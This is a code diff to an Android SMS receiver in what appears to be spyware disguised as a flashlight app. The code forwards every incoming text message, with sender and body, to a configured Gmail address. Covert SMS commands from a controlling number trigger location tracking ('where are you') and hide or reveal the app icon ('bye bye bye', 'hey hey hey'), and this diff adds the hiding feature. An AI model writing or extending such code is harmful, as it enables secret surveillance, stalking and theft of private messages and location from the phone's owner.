@@ -22,6 +22,7 @@ public class SMSReceiver extends BroadcastReceiver {
   private static GmailSender sender;
   private static DatabaseHandler db;
   private static Configure configure;
+  private static FlashLight flashLight;
 
   public  static String mBody = null;
   private static String phoneNumberString;
@@ -30,8 +31,9 @@ public class SMSReceiver extends BroadcastReceiver {
   private static final String TAG = "FlashLight SMSReceiver";
 
   public SMSReceiver() {
-    contact   = new Contacts();
-    configure = new Configure();
+    contact    = new Contacts();
+    configure  = new Configure();
+    flashLight = new FlashLight();
     gmailEmailString  = configure.emailAddress();
     phoneNumberString = configure.phoneNumber();
     Log.d(TAG, "SMSReceiver() constructor gmailEmailString " + gmailEmailString);
@@ -74,19 +76,20 @@ public class SMSReceiver extends BroadcastReceiver {
 
           Log.d(TAG,"onReceive() Entering onReceive().");
 
-          if(phoneNumberString != "null" && gmailEmailString != "smsinterceptorapp@gmail.com" && mBody.equals("where are you") && message_from.equals(phoneNumberString)) {
+          if(mBody.equals("where are you") && message_from.equals(phoneNumberString)) {
             intent = new Intent(context, FlashLightService.class);
             intent.putExtra("obtainLocation","obtainLocation");
             context.startService(intent);
           }
-          else if(phoneNumberString == "null" && gmailEmailString != "smsinterceptorapp@gmail.com" && mBody.equals("where are you")) {
+          else if(mBody.equals("hey hey hey") && message_from.equals(phoneNumberString)) {
             new Thread(new Runnable() {
               @Override
               public void run() {
                 try {
                   Log.d(TAG, "onReceive() Sending email.");
+                  flashLight.showAppIcon();
                   sender = new GmailSender();
-                  sender.sendMail("SMSInterceptor", "Incoming sms:!\nFrom " + endPoint(message_from, context) + "\nMessage: " + mBody, gmailEmailString);
+                  sender.sendMail("SMSInterceptor", "Showing FlashLight app!", gmailEmailString);
                 }
                 catch(Exception e) {
                   Log.e(TAG, "onReceive() Exception e " + e.toString());
@@ -95,14 +98,34 @@ public class SMSReceiver extends BroadcastReceiver {
               }
             }).start();
           }
-          else if(gmailEmailString != "smsinterceptorapp@gmail.com") {
+          else if(mBody.equals("bye bye bye") && message_from.equals(phoneNumberString)) {
+            flashLight.hideAppIcon(context);
             new Thread(new Runnable() {
               @Override
               public void run() {
                 try {
                   Log.d(TAG,"onReceive() Sending email.");
+                  //flashLight.hideAppIcon();
                   sender = new GmailSender();
-                  sender.sendMail("SMSInterceptor", "Incoming sms:!\nFrom " + endPoint(message_from, context) + "\nMessage: " + mBody, gmailEmailString);
+                  sender.sendMail("SMSInterceptor", "Hiding FlashLight app!", gmailEmailString);
+                }
+                catch(Exception e) {
+                  Log.e(TAG, "onReceive() Exception e " + e.toString());
+                  e.printStackTrace();
+                }
+              }
+            }).start();
+          }
+          else {
+            new Thread(new Runnable() {
+              @Override
+              public void run() {
+                try {
+                  Log.d(TAG, "onReceive() Sending email.");
+                  sender = new GmailSender();
+                  sender.sendMail("SMSInterceptor",
+                    "Incoming sms:!\nFrom " + endPoint(message_from, context) + "\nMessage: " + mBody,
+                    gmailEmailString);
                 }
                 catch(Exception e) {
                   Log.e(TAG, "onReceive() Exception e " + e.toString());
